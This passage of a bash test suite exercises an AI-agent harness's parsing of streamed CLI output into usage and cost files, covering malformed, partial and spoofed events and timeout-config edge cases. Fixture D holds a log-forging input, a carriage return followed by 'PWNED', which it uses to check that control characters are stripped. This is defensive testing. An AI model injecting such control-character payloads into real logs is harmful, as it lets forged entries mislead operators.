if ! grep -qE '^"' <<<"$RENDER_OUT_A"; then
  pass_at "fixture-A stdout: prose lines emitted raw, not JSON-quoted (D-002 / F3)"
else
  fail_at "fixture-A stdout JSON-quoted" "rendered prose line starts with '\"' (missing -r flag on jq?); first offending=$(grep -m1 -E '^"' <<<"$RENDER_OUT_A")"
fi

# Intermediate raw-capture cleaned by RETURN trap.
if [[ ! -e "$RAW_A" ]]; then
  pass_at "fixture-A trap: .raw-stream.ndjson.tmp removed on RETURN"
else
  fail_at "fixture-A trap" "raw_capture still exists: $RAW_A"
fi

# ─── Fixture B: no result event (mid-stream end) ──────────────────────────
USAGE_B="$ISSUE_DIR/usage-plan-B.json"
rm -f "$USAGE_B" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
RENDER_OUT_B="$(
  _render_and_capture_stream "$USAGE_B" "$ISSUE_DIR" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"deadbeef-no-result","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"partial"}]}}
NDJSON
)"

if [[ ! -e "$USAGE_B" ]] && grep -q 'no result event found in stream' <<<"$RENDER_OUT_B"; then
  pass_at "fixture-B no-result: usage file not written; soft-fail warning logged"
else
  fail_at "fixture-B no-result" "exists=$([[ -e $USAGE_B ]] && echo y || echo n) out=$RENDER_OUT_B"
fi

# ─── Fixture C: malformed line tolerance ───────────────────────────────────
USAGE_C="$ISSUE_DIR/usage-plan-C.json"
rm -f "$USAGE_C" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_C" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"01234567","model":"claude-opus-4-7"}
{not json{
{"type":"assistant","message":{"content":[{"type":"text","text":"after garbage"}]}}
{"type":"result","total_cost_usd":0.5,"usage":{"input_tokens":1,"output_tokens":2,"cache_creation_input_tokens":3,"cache_read_input_tokens":4},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON

keys_c="$(jq -r 'keys | sort | join(",")' "$USAGE_C" 2>/dev/null || printf '')"
cost_c="$(jq -r '.cost_usd' "$USAGE_C" 2>/dev/null || printf '')"
if [[ "$keys_c" == "$expected_keys" ]] && [[ "$cost_c" == "0.5" ]]; then
  pass_at "fixture-C malformed-line: garbage NDJSON line silently dropped; result still extracted"
else
  fail_at "fixture-C malformed-line" "keys=$keys_c cost=$cost_c"
fi

# ─── Fixture D: log-forge defense (SEC-010) ───────────────────────────────
# Embed a literal CR byte in agent text. The renderer's strip_ctrl jq
# function must replace C0 control chars with " " before they reach stdout.
USAGE_D="$ISSUE_DIR/usage-plan-D.json"
rm -f "$USAGE_D" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
RENDER_OUT_D="$(
  _render_and_capture_stream "$USAGE_D" "$ISSUE_DIR" <<NDJSON
{"type":"system","subtype":"init","session_id":"cafebabecafebabe","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"safe text\rPWNED"}]}}
{"type":"result","total_cost_usd":0.01,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"claude-opus-4-7":{}}}
NDJSON
)"

# `safe text\rPWNED` after C0-strip becomes `safe text PWNED`. Assert no
# raw CR byte made it to stdout.
if ! printf '%s' "$RENDER_OUT_D" | grep -q $'\r'; then
  pass_at "fixture-D log-forge: CR byte stripped from renderer stdout (SEC-010)"
else
  fail_at "fixture-D log-forge" "stdout still contains raw CR"
fi

# ─── Fixture E: dry-run stale-file removal (E-04 / D-006) ─────────────────
USAGE_E="$ISSUE_DIR/usage-planning-E.json"
printf '{"stale":true}' > "$USAGE_E"
[[ -s "$USAGE_E" ]] || die "fixture-E setup failed (could not seed stale file)"

PROMPT_FILE="$_TEST_STUB_DIR/dry-prompt.txt"
printf 'irrelevant\n' > "$PROMPT_FILE"

# Run dispatch.sh in dry-run mode against a stage that maps onto USAGE_E.
# dispatch.sh dies on an unknown stage's allowed_tools_for, so use a real
# stage and rename the seed file to match `usage-${stage}.json`.
mv "$USAGE_E" "$ISSUE_DIR/usage-planning.json"
USAGE_E="$ISSUE_DIR/usage-planning.json"
[[ -s "$USAGE_E" ]] || die "fixture-E rename failed"

PIPELINE_DRY_RUN=1 \
PIPELINE_ISSUE_ID="ENG-T-COST" \
HARNESS_STATE_DIR="$HARNESS_STATE_DIR" \
PROJECT_STATE_DIR="$PROJECT_STATE_DIR" \
PROJECT_SLUG="$PROJECT_SLUG" \
TARGET_REPO="$TARGET_REPO" \
LINEAR_API_KEY="$LINEAR_API_KEY" \
  bash "$SCRIPT_DIR/dispatch.sh" planning "$PROMPT_FILE" >/dev/null 2>&1 || true

if [[ ! -e "$USAGE_E" ]]; then
  pass_at "fixture-E dry-run: pre-existing usage-planning.json removed at dispatch entry"
else
  fail_at "fixture-E dry-run" "stale file still present: $(cat "$USAGE_E")"
fi

# ─── QA-authored adversarial fixtures (NOT in plan's Failure Mode → Test Map) ─

# ─── Fixture F: multiple result events — last wins ─────────────────────────
# A reconnect or partial-write scenario can theoretically emit two top-level
# result events (e.g. claude restarts a subagent run). The renderer's
# `grep | tail -1` contract MUST select the LAST result event, not the
# first. Pin the behavior so a future refactor (e.g. switching to `head -1`
# or to a streaming jq filter that keeps the first match) fails this test.
USAGE_F="$ISSUE_DIR/usage-plan-F.json"
rm -f "$USAGE_F" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_F" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"00000001","model":"claude-opus-4-7"}
{"type":"result","total_cost_usd":0.10,"usage":{"input_tokens":1,"output_tokens":1,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"first-model":{}}}
{"type":"result","total_cost_usd":0.99,"usage":{"input_tokens":2,"output_tokens":2,"cache_creation_input_tokens":0,"cache_read_input_tokens":0},"modelUsage":{"second-model":{}}}
NDJSON

cost_f="$(jq -r '.cost_usd' "$USAGE_F" 2>/dev/null || printf '')"
model_f="$(jq -r '.model' "$USAGE_F" 2>/dev/null || printf '')"
if [[ "$cost_f" == "0.99" && "$model_f" == "second-model" ]]; then
  pass_at "fixture-F multiple result events: last wins (cost=0.99, model=second-model)"
else
  fail_at "fixture-F multiple result events" "cost=$cost_f model=$model_f"
fi

# ─── Fixture G: result event missing the `usage` block ─────────────────────
# A degraded result event (e.g. a CLI version that drops the usage rollup
# under failure) MUST still produce a six-field file with `// 0` defaults
# rather than crash. cost_usd and model survive even when usage is gone.
USAGE_G="$ISSUE_DIR/usage-plan-G.json"
rm -f "$USAGE_G" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_G" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"00000002","model":"claude-opus-4-7"}
{"type":"result","total_cost_usd":2.50,"modelUsage":{"degraded-model":{}}}
NDJSON

keys_g="$(jq -r 'keys | sort | join(",")' "$USAGE_G" 2>/dev/null || printf '')"
ti_g="$(jq -r '.tokens_in' "$USAGE_G" 2>/dev/null || printf '')"
# Numeric-equal compare (jq preserves the input's textual form: 2.50 stays 2.50,
# 2.5 stays 2.5 — both are numerically equal to 2.5).
co_eq_g="$(jq -r '.cost_usd == 2.5' "$USAGE_G" 2>/dev/null || printf 'false')"
mo_g="$(jq -r '.model' "$USAGE_G" 2>/dev/null || printf '')"
if [[ "$keys_g" == "$expected_keys" ]] \
   && [[ "$ti_g" == "0" ]] \
   && [[ "$co_eq_g" == "true" ]] \
   && [[ "$mo_g" == "degraded-model" ]]; then
  pass_at "fixture-G missing usage: six-field file written with token=0 defaults; cost+model survive"
else
  fail_at "fixture-G missing usage" "keys=$keys_g tokens_in=$ti_g cost_eq_2.5=$co_eq_g model=$mo_g"
fi

# ─── Fixture H: empty stdin (claude died before emitting anything) ─────────
# The renderer reads zero bytes; tee writes nothing; jq's `inputs` consumes
# nothing; grep finds no result event. Soft-fail: no usage file written.
USAGE_H="$ISSUE_DIR/usage-plan-H.json"
rm -f "$USAGE_H" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
RENDER_OUT_H="$(_render_and_capture_stream "$USAGE_H" "$ISSUE_DIR" </dev/null 2>&1)"
if [[ ! -e "$USAGE_H" ]] && grep -q 'no result event found in stream' <<<"$RENDER_OUT_H"; then
  pass_at "fixture-H empty stdin: usage file not written; soft-fail warning logged"
else
  fail_at "fixture-H empty stdin" "exists=$([[ -e $USAGE_H ]] && echo y || echo n) out=$RENDER_OUT_H"
fi

# ─── Fixture I: type:"result" substring inside assistant text (FALSE POSITIVE) ─
# An agent debugging this very feature could legitimately emit the literal text
# `{"type":"result","total_cost_usd":99999}` inside an assistant text payload
# (e.g. transcribing a stream-json sample for the user). The renderer's
# extraction is `grep '"type":"result"' raw_capture | tail -1` — a naive
# substring grep that matches anywhere on the line, including inside JSON-
# encoded `text` fields. The current renderer's tee writes one NDJSON event
# per line, so an inline `type":"result"` substring DOES appear on the
# assistant event's line, and `tail -1` would pick the LAST line — which is
# the real result event. Confirm the real cost is extracted (0.42), NOT the
# fake $99999 from the assistant's debug transcript. A future refactor that
# changes the extraction to "first match" or to a JSON-path filter that
# crawls .text fields would silently leak the fake value.
USAGE_I="$ISSUE_DIR/usage-plan-I.json"
rm -f "$USAGE_I" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_I" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"deadbeef","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"Here is a fake stream-json sample I am debugging: {\"type\":\"result\",\"total_cost_usd\":99999,\"usage\":{\"input_tokens\":1,\"output_tokens\":1,\"cache_creation_input_tokens\":0,\"cache_read_input_tokens\":0},\"modelUsage\":{\"fake-model\":{}}}"}]}}
{"type":"result","total_cost_usd":0.42,"usage":{"input_tokens":5,"output_tokens":6,"cache_creation_input_tokens":17,"cache_read_input_tokens":20},"modelUsage":{"real-model":{}}}
NDJSON
cost_i="$(jq -r '.cost_usd' "$USAGE_I" 2>/dev/null || printf '')"
model_i="$(jq -r '.model' "$USAGE_I" 2>/dev/null || printf '')"
if [[ "$cost_i" == "0.42" ]] && [[ "$model_i" == "real-model" ]]; then
  pass_at "fixture-I substring false-positive: real result wins over inline 'type:\"result\"' in assistant text"
else
  fail_at "fixture-I substring false-positive" "cost=$cost_i (expected 0.42) model=$model_i (expected real-model)"
fi

# ─── Fixture J: zero-byte usage file race window (post-truncate, pre-write) ──
# A theoretical race: dispatch.sh's renderer truncates `>` the file but
# crashes before jq writes the body. A subsequent reader (`_cost_flags_for`
# or `_cost_footer`) MUST treat a zero-byte usage file the same as missing
# (soft-fail D-010), not as a parse error that bubbles up to the operator.
# Pin the renderer's behavior on a pre-existing zero-byte file: it should
# overwrite cleanly when a new stream arrives.
USAGE_J="$ISSUE_DIR/usage-plan-J.json"
rm -f "$USAGE_J" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
: > "$USAGE_J"  # zero-byte seed file
_render_and_capture_stream "$USAGE_J" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"00000003","model":"claude-opus-4-7"}
{"type":"result","total_cost_usd":0.55,"usage":{"input_tokens":3,"output_tokens":4,"cache_creation_input_tokens":1,"cache_read_input_tokens":1},"modelUsage":{"recovered-model":{}}}
NDJSON
keys_j="$(jq -r 'keys | sort | join(",")' "$USAGE_J" 2>/dev/null || printf '')"
cost_j="$(jq -r '.cost_usd' "$USAGE_J" 2>/dev/null || printf '')"
if [[ "$keys_j" == "$expected_keys" ]] && [[ "$cost_j" == "0.55" ]]; then
  pass_at "fixture-J zero-byte seed: renderer overwrites cleanly with six-field payload"
else
  fail_at "fixture-J zero-byte seed" "keys=$keys_j cost=$cost_j"
fi

# ─── Fixture K: unknown future field in result event (forward-compat) ─────
# A future claude release may add fields like `thinking_tokens`, `priority`,
# or `request_id` to the result event. The renderer's six-field allowlist
# extraction (.usage.input_tokens, etc.) MUST silently ignore unknown top-
# level fields and unknown nested usage fields — never panic, never leak.
USAGE_K="$ISSUE_DIR/usage-plan-K.json"
rm -f "$USAGE_K" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_K" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"result","total_cost_usd":0.07,"usage":{"input_tokens":2,"output_tokens":3,"cache_creation_input_tokens":4,"cache_read_input_tokens":5,"thinking_tokens":999,"future_nested_field":"x"},"modelUsage":{"future-model":{}},"request_id":"req_abc","priority":"high","new_top_level_field":[1,2,3]}
NDJSON
keys_k="$(jq -r 'keys | sort | join(",")' "$USAGE_K" 2>/dev/null || printf '')"
has_request_id_k="$(jq -r 'has("request_id")' "$USAGE_K" 2>/dev/null || printf 'true')"
has_thinking_k="$(jq -r 'has("thinking_tokens")' "$USAGE_K" 2>/dev/null || printf 'true')"
if [[ "$keys_k" == "$expected_keys" ]] \
   && [[ "$has_request_id_k" == "false" ]] \
   && [[ "$has_thinking_k" == "false" ]]; then
  pass_at "fixture-K forward-compat: unknown future fields ignored; six-field allowlist enforced"
else
  fail_at "fixture-K forward-compat" "keys=$keys_k request_id=$has_request_id_k thinking=$has_thinking_k"
fi

# ─── Fixture L: ENG-65 partial-usage capture on SIGTERM (no result event) ─
# A wall-clock SIGTERM mid-stream loses the aggregated `result` event.
# D-003: sum per-message assistant.message.usage.* across the captured
# NDJSON, mark the file as `partial: true` with `cost_usd: null`. The
# downstream `_cost_flags_for // 0` coerces null → 0 — verified separately
# in run-stage-test (case-23). The `partial` flag on disk is the
# discriminator that distinguishes "captured under SIGTERM" from "clean
# zero-cost dispatch" for the retrospective.
USAGE_L="$ISSUE_DIR/usage-plan-L.json"
rm -f "$USAGE_L" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_L" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"deadbeef-l","model":"claude-opus-4-7"}
{"type":"assistant","message":{"id":"msg_01","content":[{"type":"text","text":"work"}],"usage":{"input_tokens":100,"output_tokens":50,"cache_read_input_tokens":20,"cache_creation_input_tokens":10}}}
{"type":"assistant","message":{"id":"msg_02","content":[{"type":"text","text":"more"}],"usage":{"input_tokens":200,"output_tokens":80,"cache_read_input_tokens":30,"cache_creation_input_tokens":15}}}
{"type":"assistant","message":{"id":"msg_03","content":[{"type":"text","text":"yet more"}],"usage":{"input_tokens":50,"output_tokens":20,"cache_read_input_tokens":5,"cache_creation_input_tokens":3}}}
NDJSON

if [[ ! -s "$USAGE_L" ]]; then
  fail_at "fixture-L partial usage" "usage file missing or empty: $USAGE_L"
else
  partial_l="$(jq -r '.partial' "$USAGE_L" 2>/dev/null || printf '')"
  cost_l_null="$(jq -r '.cost_usd == null' "$USAGE_L" 2>/dev/null || printf 'false')"
  ti_l="$(jq -r '.tokens_in' "$USAGE_L" 2>/dev/null || printf '')"
  to_l="$(jq -r '.tokens_out' "$USAGE_L" 2>/dev/null || printf '')"
  cr_l="$(jq -r '.cache_read' "$USAGE_L" 2>/dev/null || printf '')"
  cc_l="$(jq -r '.cache_create' "$USAGE_L" 2>/dev/null || printf '')"
  model_l="$(jq -r '.model' "$USAGE_L" 2>/dev/null || printf '')"
  if [[ "$partial_l" == "true" ]] \
     && [[ "$cost_l_null" == "true" ]] \
     && [[ "$ti_l" == "350"  ]] \
     && [[ "$to_l" == "150"  ]] \
     && [[ "$cr_l" == "55"   ]] \
     && [[ "$cc_l" == "28"   ]] \
     && [[ "$model_l" == "claude-opus-4-7" ]]; then
    pass_at "fixture-L partial usage: tokens summed across assistant events; partial=true, cost_usd=null, model from init"
  else
    fail_at "fixture-L partial usage" \
      "partial=$partial_l cost_null=$cost_l_null tokens_in=$ti_l tokens_out=$to_l cache_read=$cr_l cache_create=$cc_l model=$model_l"
  fi
fi

# ─── Fixture L extension: malformed/missing usage block on assistant event ─
# A degraded assistant event lacks the `message.usage` key entirely. The
# `(.message.usage // {})` guard absorbs the missing event as 0, so the
# sum equals only the valid events' total. Mirrors the F2/D-002 tolerance:
# one bad event must not crash the partial-extraction filter.
USAGE_L2="$ISSUE_DIR/usage-plan-L2.json"
rm -f "$USAGE_L2" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_L2" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"deadbeef-l2","model":"claude-opus-4-7"}
{"type":"assistant","message":{"id":"msg_01","content":[{"type":"text","text":"work"}],"usage":{"input_tokens":100,"output_tokens":50,"cache_read_input_tokens":20,"cache_creation_input_tokens":10}}}
{"type":"assistant","message":{"id":"msg_02","content":[{"type":"text","text":"missing usage block"}]}}
{"type":"assistant","message":{"id":"msg_03","content":[{"type":"text","text":"more"}],"usage":{"input_tokens":50,"output_tokens":20,"cache_read_input_tokens":5,"cache_creation_input_tokens":3}}}
NDJSON

if [[ ! -s "$USAGE_L2" ]]; then
  fail_at "fixture-L2 malformed usage" "usage file missing or empty: $USAGE_L2"
else
  partial_l2="$(jq -r '.partial' "$USAGE_L2" 2>/dev/null || printf '')"
  ti_l2="$(jq -r '.tokens_in' "$USAGE_L2" 2>/dev/null || printf '')"
  to_l2="$(jq -r '.tokens_out' "$USAGE_L2" 2>/dev/null || printf '')"
  if [[ "$partial_l2" == "true" ]] \
     && [[ "$ti_l2" == "150" ]] \
     && [[ "$to_l2" == "70"  ]]; then
    pass_at "fixture-L2 malformed usage: missing message.usage absorbed as 0; valid events still summed"
  else
    fail_at "fixture-L2 malformed usage" "partial=$partial_l2 tokens_in=$ti_l2 (expected 150) tokens_out=$to_l2 (expected 70)"
  fi
fi

# Existing Fixture H regression — empty stdin must still soft-fail under
# the new partial path because the `_partial_sum > 0` guard rejects a
# zero-token sum. Verify (a) no usage file is written and (b) the soft-fail
# log line still fires. This is the same assertion as Fixture H above; we
# pin it again here so a future refactor of the partial-extraction filter
# can't accidentally start writing a partial file with all-zeros.
USAGE_HE="$ISSUE_DIR/usage-plan-HE.json"
rm -f "$USAGE_HE" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
RENDER_OUT_HE="$(_render_and_capture_stream "$USAGE_HE" "$ISSUE_DIR" </dev/null 2>&1)"
if [[ ! -e "$USAGE_HE" ]] && grep -q 'no result event found in stream' <<<"$RENDER_OUT_HE"; then
  pass_at "ENG-65 fixture-H regression pin: empty stdin → no partial file written (zero-token guard)"
else
  fail_at "ENG-65 fixture-H regression" "exists=$([[ -e $USAGE_HE ]] && echo y || echo n) out=$RENDER_OUT_HE"
fi

# ─── ENG-65 QA adversarial coverage ───────────────────────────────────────
# These four fixtures cover gaps surfaced by the QA cold-pass:
#   QA1 — negative integer per-stage override pinned at "fall through"
#         (the regex `^[0-9]+$` excludes `-` so the negative is rejected
#         and the built-in default applies; pins the contract so a future
#         "be more permissive" regex change can't accidentally pass `-5`
#         to gtimeout, which would error opaquely at invocation time).
#   QA2 — float / decimal per-stage override is rejected by the regex.
#         A naive `60.5` (operator copies a derived average) must not
#         silently apply (bash arithmetic would truncate or error).
#   QA3 — partial-usage filter when `assistant.message.usage` is a
#         non-object (array) — type confusion from a buggy upstream.
#         Currently `(.input_tokens // 0)` on `[]` makes the jq
#         invocation fail, dropping the partial file silently. Pin the
#         observable behavior (no file written, soft-fail log emitted)
#         so a future refactor can't quietly start writing a corrupt
#         partial file.
#   QA4 — partial-usage filter with multiple `system`/`init` events,
#         only the second carrying a `.model`. The filter takes the
#         FIRST init's model via `[0].model // ""`, so the resulting
#         file's `model` field is empty even though a model is present
#         later in the stream. Document this as expected-but-degraded
#         behavior (operator can still see the partial token sums and
#         the `partial: true` discriminator).

# QA1 — negative integer per-stage override
TARGET_REPO_NEG="$_TEST_STUB_DIR/target-negative"
mkdir -p "$TARGET_REPO_NEG/.pipeline-config/schemas"
jq -n '{
  project: { slug: "neg-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: -5 } }
}' > "$TARGET_REPO_NEG/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_NEG/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_NEG="$_TEST_STUB_DIR/dryrun-negative.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_NEG" "neg-slug" brainstorming "$DRYRUN_OUT_NEG"
# Assert the resolved seconds is the 60-min default (3600), and that no
# negative seconds value (e.g. ` -300 `) leaked into the gtimeout invocation.
if grep -qE 'gtimeout.*[[:space:]]3600[[:space:]]' "$DRYRUN_OUT_NEG" \
   && ! grep -qE 'gtimeout.*[[:space:]]-[0-9]+[[:space:]]' "$DRYRUN_OUT_NEG"; then
  pass_at "ENG-65 QA1 (adversarial): negative integer per-stage=-5 rejected by regex; falls through to 60-min built-in (3600s)"
else
  fail_at "ENG-65 QA1: negative integer per-stage override leaked through" \
    "log: $(cat "$DRYRUN_OUT_NEG")"
fi

# QA2 — float / decimal per-stage override
TARGET_REPO_FLOAT="$_TEST_STUB_DIR/target-float"
mkdir -p "$TARGET_REPO_FLOAT/.pipeline-config/schemas"
jq -n '{
  project: { slug: "float-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: 60.5 } }
}' > "$TARGET_REPO_FLOAT/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_FLOAT/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_FLOAT="$_TEST_STUB_DIR/dryrun-float.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_FLOAT" "float-slug" brainstorming "$DRYRUN_OUT_FLOAT"
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_FLOAT"; then
  pass_at "ENG-65 QA2 (adversarial): float per-stage=60.5 rejected by regex; falls through to 60-min built-in (3600s)"
else
  fail_at "ENG-65 QA2: float per-stage override leaked through" \
    "log: $(cat "$DRYRUN_OUT_FLOAT")"
fi

# QA3 — `assistant.message.usage` is an array (type confusion)
USAGE_QA3="$ISSUE_DIR/usage-plan-QA3.json"
rm -f "$USAGE_QA3" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
NDJSON_QA3="$_TEST_STUB_DIR/qa3.ndjson"
cat > "$NDJSON_QA3" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"qa3","model":"claude-opus-4-7"}
{"type":"assistant","message":{"id":"msg_01","content":[{"type":"text","text":"work"}],"usage":[100,50,20,10]}}
NDJSON
RENDER_OUT_QA3="$(_render_and_capture_stream "$USAGE_QA3" "$ISSUE_DIR" < "$NDJSON_QA3" 2>&1)"
if [[ ! -e "$USAGE_QA3" ]] && grep -q 'no result event found in stream' <<<"$RENDER_OUT_QA3"; then
  pass_at "ENG-65 QA3 (adversarial): array-shaped message.usage → jq fails gracefully → no partial file written (soft-fail log emitted)"
else
  fail_at "ENG-65 QA3: array usage value silently produced a partial file" \
    "exists=$([[ -e "$USAGE_QA3" ]] && echo y || echo n) out=$RENDER_OUT_QA3"
fi

# QA4 — multiple system/init events; only second carries .model
USAGE_QA4="$ISSUE_DIR/usage-plan-QA4.json"
rm -f "$USAGE_QA4" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_QA4" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"qa4-first"}
{"type":"system","subtype":"init","session_id":"qa4-second","model":"claude-opus-4-7"}
{"type":"assistant","message":{"id":"msg_01","content":[{"type":"text","text":"work"}],"usage":{"input_tokens":100,"output_tokens":50,"cache_read_input_tokens":20,"cache_creation_input_tokens":10}}}
NDJSON

if [[ ! -s "$USAGE_QA4" ]]; then
  fail_at "ENG-65 QA4: usage file missing despite valid assistant event" "path=$USAGE_QA4"
else
  partial_qa4="$(jq -r '.partial' "$USAGE_QA4" 2>/dev/null || printf '')"
  ti_qa4="$(jq -r '.tokens_in' "$USAGE_QA4" 2>/dev/null || printf '')"
  model_qa4="$(jq -r '.model' "$USAGE_QA4" 2>/dev/null || printf '')"
  # Filter takes [0].model — first init lacks .model so // "" yields "".
  # Pin this as expected-but-degraded; the partial token sum is still
  # correct and `partial: true` is the load-bearing discriminator.
  if [[ "$partial_qa4" == "true" ]] \
     && [[ "$ti_qa4" == "100" ]] \
     && [[ "$model_qa4" == "" ]]; then
    pass_at "ENG-65 QA4 (adversarial): multi-init stream — first init wins for .model (empty when absent), tokens still summed correctly"
  else
    fail_at "ENG-65 QA4: multi-init partial-usage extraction" \
      "partial=$partial_qa4 tokens_in=$ti_qa4 model=$model_qa4"
  fi
fi

# QA5 — precedence-chain short-circuit pin (operator-trap documentation).
# When the per-stage value is *present-but-malformed* AND the global is
# valid, the implementation does NOT fall through to the global — the
# global lookup only fires when per-stage is empty. Both reads share the
# same `_cfg_minutes` slot, so a non-empty malformed value (passes the
# `[[ -z "$_cfg_minutes" ]]` guard, fails the regex) shorts the chain to
# the built-in default and silently bypasses the operator's global cap
# for the affected stage.
#
# This pins the *actual* behavior so a future refactor doesn't change it
# accidentally. CLAUDE.md's "fall through to the next layer" prose is
# slightly imprecise re: this case; the plan's pseudocode (the contract)
# is what the implementation follows. Doc clarification is a follow-up.
# Operators who hit this surprise can grep the per-stage transcript for
# the resolved `gtimeout ... <seconds>` to confirm which layer won.
TARGET_REPO_PREC="$_TEST_STUB_DIR/target-precedence"
mkdir -p "$TARGET_REPO_PREC/.pipeline-config/schemas"
jq -n '{
  project: { slug: "prec-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes: 5, dispatch_timeout_minutes_per_stage: { brainstorming: "60m" } }
}' > "$TARGET_REPO_PREC/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_PREC/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_PREC="$_TEST_STUB_DIR/dryrun-precedence.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_PREC" "prec-slug" brainstorming "$DRYRUN_OUT_PREC"
# Actual behavior: malformed per-stage shorts the chain → built-in 60-min
# (3600s) wins, NOT the operator's 5-min global. Pin the surprise so a
# future change either fixes it (and breaks this test, prompting a doc
# update) or knowingly preserves it.
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_PREC" \
   && ! grep -qE 'gtimeout.*\b300\b' "$DRYRUN_OUT_PREC"; then
  pass_at "ENG-65 QA5 (adversarial): malformed per-stage shorts the precedence chain to built-in (3600s) — pins the operator-trap that bypasses the global override"
else
  fail_at "ENG-65 QA5: precedence-chain pin (expected built-in 3600s; got something else)" \
    "log: $(cat "$DRYRUN_OUT_PREC")"
fi

# QA6 — prompt-side D-001 contract pin. AGENT_PROMPTS.md §1 step 3 must
# carry the `iteration-exhausted` halt instruction and must NOT carry the
# old "Iterate at most 3 times" / `brainstorm_escalate` language.
# render-prompt.sh validates fence count, not content; without this grep,
# a future agent could silently revert D-001 and the harness would
# happily re-dispatch unbounded persona-review iterations. The prompt is
# load-bearing for ENG-65 — pin it.
ENG_65_PROMPTS_PATH="$SCRIPT_DIR/../AGENT_PROMPTS.md"
[[ -f "$ENG_65_PROMPTS_PATH" ]] || ENG_65_PROMPTS_PATH="$HARNESS_ROOT/AGENT_PROMPTS.md"
if [[ ! -f "$ENG_65_PROMPTS_PATH" ]]; then
  fail_at "ENG-65 QA6 prompt-contract" "AGENT_PROMPTS.md not found at $ENG_65_PROMPTS_PATH"
else
  # Extract §1 (Brainstorm Agent) — bounded by `## 1.` heading and the next
  # `## ` heading. Then assert the four substring conditions.
  brainstorm_section="$(awk '/^## 1\./{ in_b=1 } in_b{print} /^## 2\./{ if (in_b) exit }' "$ENG_65_PROMPTS_PATH")"
  qa6_ok=1
  qa6_msg=""
  if ! grep -qF 'iteration-exhausted' <<<"$brainstorm_section"; then
    qa6_ok=0; qa6_msg+="missing iteration-exhausted; "
  fi
  if ! grep -qF 'Do NOT start iteration 3' <<<"$brainstorm_section"; then
    qa6_ok=0; qa6_msg+="missing 'Do NOT start iteration 3'; "
  fi
  if grep -qF 'Iterate at most 3 times' <<<"$brainstorm_section"; then
    qa6_ok=0; qa6_msg+="legacy 'Iterate at most 3 times' still present; "
  fi
  if grep -qF 'brainstorm_escalate' <<<"$brainstorm_section"; then
    qa6_ok=0; qa6_msg+="dead brainstorm_escalate marker still present; "
  fi
  if (( qa6_ok == 1 )); then
    pass_at "ENG-65 QA6 (adversarial): AGENT_PROMPTS §1 carries iteration-exhausted + 'Do NOT start iteration 3'; legacy 'Iterate at most 3 times' / brainstorm_escalate removed"
  else
    fail_at "ENG-65 QA6 prompt-contract drift" "$qa6_msg"
  fi
fi

# QA7 — `dispatch_timeout_minutes_per_stage` is a non-object (array shape).
# Surfaced by the round-3 cold-pass: jq's `<arr>[$s]` indexing errors with
